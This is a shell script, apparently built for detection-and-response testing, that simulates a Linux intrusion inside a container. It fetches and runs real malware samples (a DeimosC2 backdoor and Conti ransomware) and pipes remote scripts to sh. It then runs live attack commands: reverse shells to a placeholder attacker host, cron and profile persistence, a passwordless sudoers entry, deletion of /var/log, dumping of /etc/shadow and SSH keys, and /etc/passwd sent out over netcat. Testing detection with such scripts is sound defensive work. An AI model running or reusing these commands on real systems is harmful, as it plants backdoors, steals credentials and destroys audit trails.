#!/bin/sh
# Configured for a Busybox/Alpine container by hreed@paloaltonetworks.com
# This script simulates various malicious activities for detection and response testing.

# Update Alpine package manager
echo -e "\033[1;32m[+]\033[0m Updating Alpine package manager..."
apk update
apk upgrade

# Network scanning tools
echo -e "\033[1;32m[+]\033[0m Adding Network Scanning Tools"
apk add nmap tor socat

# Script execution environments
echo -e "\033[1;32m[+]\033[0m Adding script execution environments"
apk add busybox-extras bash python3 py3-pip

# Binary compilers and build tools
echo -e "\033[1;32m[+]\033[0m Adding Linux Binary Compilers"
apk add git build-base cmake libuv-dev openssl-dev hwloc-dev
apk add --no-cache gcc g++
apk add --no-cache clang llvm

# SCENARIO 1 --- Script Activity / Linux Enumeration 
# Outcome: Detect suspicious script activity
echo -e "\033[1;33mScenario 1 - Smart Enumeration Script Activity\033[0m"

echo -e "\033[1;32m[+]\033[0m Downloading enumeration script using wget..."
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O enum_script.sh
chmod +x enum_script.sh
sleep 3

echo -e "\033[1;32m[+]\033[0m Executing enumeration script."
sh enum_script.sh
sleep 3

echo -e "\033[1;32m[+]\033[0m Downloading linpeas for further enumeration"
wget -qO- https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
sleep 3 

# SCENARIO 2 --- Local Malware 
echo -e "\033[1;33mScenario 2 - Malware Protection - Wildfire Analysis\033[0m"

echo -e "\033[1;32m[+]\033[0m Downloading Unix backdoor script"
wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
chmod 700 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
sleep 3

echo -e "\033[1;32m[+]\033[0m Creating copies in suspicious places"
cat 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 > /loader.sh
chmod +x /loader.sh

echo -e "\033[1;32m[+]\033[0m Creating more shadow copies" 
cat 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 > /bin/nonsus.sh
chmod +x /bin/nonsus.sh
sleep 3 

echo -e "\033[1;32m[+]\033[0m Making Unix backdoor executable"

echo -e "\033[1;32m[+]\033[0m Downloading Conti-C2 malware"
wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Conti/bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e.elf.x86_64 -O conti.sh
sleep 3

echo -e "\033[1;32m[+]\033[0m Making Conti ransomware executable"
chmod 700 conti.sh
sleep 3

echo -e "\033[1;32m[+]\033[0m Downloading C2 client"
wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -O c2.sh
sleep 3

echo -e "\033[1;32m[+]\033[0m Changing C2 Client file permissions to executable" 
chmod +x c2.sh
sleep 3

# Execution of Malware (suppress errors with `|| true`)
echo -e "\033[1;32m[+]\033[0m Calling malware executables"
./05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 || echo -e "\033[1;31m[!]\033[0m Malware execution failed - Continuing..."
./conti.sh || echo -e "\033[1;31m[!]\033[0m Conti execution failed - Continuing..."
./c2.sh || echo -e "\033[1;31m[!]\033[0m C2 execution failed - Continuing..."

## RANSOMWARE POC
echo -e "\033[1;32m[+]\033[0m Cloning Ransomware-PoC"
git clone https://github.com/jimmy-ly00/Ransomware-PoC
cd Ransomware-PoC 
pip3 install pycryptodome
# Instructions for usage (not executed):
# Encrypt: python3 main_v2.py -p "/home/jimmy/test_ransomware" -e
# Decrypt: python3 main_v2.py -p "/home/jimmy/test_ransomware" -d
cd ..

## MASSCAN 
echo -e "\033[1;32m[+]\033[0m Downloading and building masscan"
git clone https://github.com/robertdavidgraham/masscan.git
cd masscan
make
cd ..

# MITRE ATT&CK TTP Demonstration Script
# === Initial Access and Execution ===
echo -e "\033[1;34m[*]\033[0m Attempting SSH Access..."
ssh user@localhost || echo -e "\033[1;31m[!]\033[0m SSH failed - Continuing..."

echo -e "\033[1;34m[*]\033[0m Creating reverse shell..."
bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1 || echo -e "\033[1;31m[!]\033[0m Reverse shell failed - Continuing..."

# === Persistence ===
echo -e "\033[1;34m[*]\033[0m Adding a cron job for persistence..."
echo "* * * * * root /bin/sh -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1" >> /etc/crontabs/root

echo -e "\033[1;34m[*]\033[0m Adding a malicious script to .profile..."
echo "/bin/sh -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1" >> ~/.profile

# === Privilege Escalation ===
echo -e "\033[1;34m[*]\033[0m Modifying sudoers file for privilege escalation..."
echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers

echo -e "\033[1;34m[*]\033[0m Switching to root user..."
sudo su - || echo -e "\033[1;31m[!]\033[0m Failed to switch to root - Continuing..."

# === Defense Evasion ===
echo -e "\033[1;34m[*]\033[0m Removing log files..."
rm -rf /var/log/*

echo -e "\033[1;34m[*]\033[0m Changing permissions for /etc/shadow..."
chmod 600 /etc/shadow

# === Credential Access ===
echo -e "\033[1;34m[*]\033[0m Dumping /etc/shadow for credential access..."
cat /etc/shadow || echo -e "\033[1;31m[!]\033[0m Failed to read /etc/shadow - Continuing..."

echo -e "\033[1;34m[*]\033[0m Extracting saved credentials from .bash_history..."
cat ~/.bash_history | grep password

# === Discovery ===
echo -e "\033[1;34m[*]\033[0m Gathering system information..."
uname -a

echo -e "\033[1;34m[*]\033[0m Checking network interfaces..."
ifconfig -a

echo -e "\033[1;34m[*]\033[0m Listing running processes..."
ps aux

echo -e "\033[1;34m[*]\033[0m Listing contents of critical directories..."
ls -alh /etc

# === Lateral Movement ===
echo -e "\033[1;34m[*]\033[0m Attempting SSH to target machine..."
ssh user@target-machine || echo -e "\033[1;31m[!]\033[0m SSH to target failed - Continuing..."

# === Collection ===
echo -e "\033[1;34m[*]\033[0m Reading SSH keys..."
cat ~/.ssh/id_rsa

echo -e "\033[1;34m[*]\033[0m Archiving files for exfiltration..."
tar -czvf collected_data.tar.gz /etc /home

echo -e "\033[1;34m[*]\033[0m Creating reverse shell using netcat..."
nc -e /bin/sh [ATTACKER_IP] [PORT] || echo -e "\033[1;31m[!]\033[0m Netcat reverse shell failed - Continuing..."

# === Exfiltration ===
echo -e "\033[1;34m[*]\033[0m Exfiltrating /etc/passwd..."
cat /etc/passwd | nc [ATTACKER_IP] [PORT] || echo -e "\033[1;31m[!]\033[0m Exfiltration failed - Continuing..."

# === Impact ===
echo -e "\033[1;34m[*]\033[0m Disabling SSH service..."
service sshd stop || echo -e "\033[1;31m[!]\033[0m Failed to stop SSH service - Continuing..."

echo -e "\033[1;34m[*]\033[0m Encrypting sensitive data..."
tar -cf sensitive_data.tar /important_dir && openssl enc -aes-256-cbc -salt -in sensitive_data.tar -out sensitive_data.tar.enc -k [PASSWORD]

### Network Scanning Local 
echo -e "\033[1;32m[+]\033[0m Starting local scanning process"
nmap -p- 10.0.0.0/16 > localhost.txt

### Network Scanning with address list 
echo -e "\033[1;32m[+]\033[0m Downloading hosts list and scanning"
wget -O url2.txt https://gist.githubusercontent.com/scrubmx/c02474b2b80fbca721be2fa2d9f203c8/raw/dd0d4b55c4e5c0670ffc182085517dbdad81642a/hosts.csv
nmap -iL url2.txt

### Network Scanning Local 
echo -e "\033[1;32m[+]\033[0m Starting scanning process"
nmap -p- 10.0.0.0/16 > localhost.txt

### Network Scanning - download address list 
echo -e "\033[1;32m[+]\033[0m Downloading address list"
wget https://gist.githubusercontent.com/scrubmx/c02474b2b80fbca721be2fa2d9f203c8/raw/dd0d4b55c4e5c0670ffc182085517dbdad81642a/hosts.csv -O url2.txt 
nmap -iL url2.txt

# TOR Scenario (commented out)
# echo -e "\033[1;32m[+]\033[0m Configuring Tor Hidden Service..."
# mkdir -p /etc/tor/hidden_service
# echo "HiddenServiceDir /etc/tor/hidden_service
# HiddenServicePort 80 127.0.0.1:8080" > /etc/tor/torrc
# tor & 
# sleep 10
# cat /etc/tor/hidden_service/hostname

echo -e "\033[1;32m[+]\033[0m Simulation Complete."